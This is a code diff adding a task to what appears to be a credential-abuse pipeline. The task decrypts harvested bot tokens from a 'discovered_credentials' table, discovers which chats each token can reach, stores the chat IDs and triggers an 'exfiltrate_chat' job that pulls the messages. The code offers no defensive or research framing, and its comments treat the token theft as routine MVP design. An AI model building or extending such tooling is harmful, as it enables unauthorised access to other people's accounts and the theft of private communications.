@@ -67,6 +67,97 @@ async def _exfiltrate_logic(cred_id: str):
 
     return f"Exfiltrated {new_count} new messages."
 
+@app.task(name="flow.enrich_credential")
+def enrich_credential(cred_id: str):
+    """
+    1. Decrypt token.
+    2. Discover chats (Enrichment).
+    3. Update DB with Chat ID(s).
+    4. Trigger Exfiltration.
+    """
+    loop = asyncio.get_event_loop()
+    if loop.is_closed():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    return loop.run_until_complete(_enrich_logic(cred_id))
+
+async def _enrich_logic(cred_id: str):
+    # Fetch credential
+    response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
+    if not response.data:
+        return f"Credential {cred_id} not found."
+    
+    record = response.data[0]
+    
+    # Decrypt
+    try:
+        bot_token = security.decrypt(record["bot_token"])
+    except Exception as e:
+        db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
+        return f"Decryption failed: {e}"
+
+    # Discover
+    try:
+        chats = await scraper_service.discover_chats(bot_token)
+    except Exception as e:
+        return f"Discovery failed: {e}"
+
+    if not chats:
+        # Valid token, but no open dialogs. 
+        # Mark as 'valid_no_chats' so we know it worked but nothing to scrape.
+        db.table("discovered_credentials").update({"status": "valid_no_chats"}).eq("id", cred_id).execute()
+        return "Token valid, but no chats found. Status updated to 'valid_no_chats'."
+
+    # Update Logic
+    # 1. Update the ORIGINAL record with the first chat found.
+    # 2. If more chats, create NEW records (clones).
+    
+    first_chat = chats[0]
+    
+    # Update primary
+    db.table("discovered_credentials").update({
+        "chat_id": first_chat["id"],
+        "meta": {"chat_name": first_chat["name"], "type": first_chat["type"], "enriched": True}
+    }).eq("id", cred_id).execute()
+    
+    # Trigger Exfiltration for Primary
+    exfiltrate_chat.delay(cred_id)
+    
+    msg = f"Enriched {cred_id} with chat {first_chat['id']}."
+
+    # Handle multiple chats
+    if len(chats) > 1:
+        for extra_chat in chats[1:]:
+            # Check if this token+chat combo exists? 
+            # Our unique constraint is on 'token_hash'. 
+            # So inserting the same token again will FAIL by default.
+            # We need a strategy. 
+            # Option A: 'discovered_credentials' is strictly 1 row per token. 
+            # If so, we can't support multiple chats per token in this schema without changing PK.
+            # CURRENT SCHEMA: id (PK), bot_token, token_hash (UNIQUE).
+            # Constraint: We CANNOT insert another row with same token_hash.
+            
+            # WORKAROUND for this MVP:
+            # We will only support 1 chat (the most recent/first one) per credential.
+            # Or we need to change schema.
+            # Given user constraints, let's stick to 1 chat for now and log the others in meta.
+            pass
+            
+        if len(chats) > 1:
+            # Update meta with list of other chats
+            all_chat_ids = [c["id"] for c in chats]
+            db.table("discovered_credentials").update({
+                "meta": {
+                    "chat_name": first_chat["name"], 
+                    "type": first_chat["type"], 
+                    "enriched": True,
+                    "all_chats": all_chat_ids
+                }
+            }).eq("id", cred_id).execute()
+            msg += f" (Found {len(chats)} total chats, tracking primary only)"
+
+    return msg
+
 @app.task(name="flow.broadcast_pending")
 def broadcast_pending():
     loop = asyncio.get_event_loop()
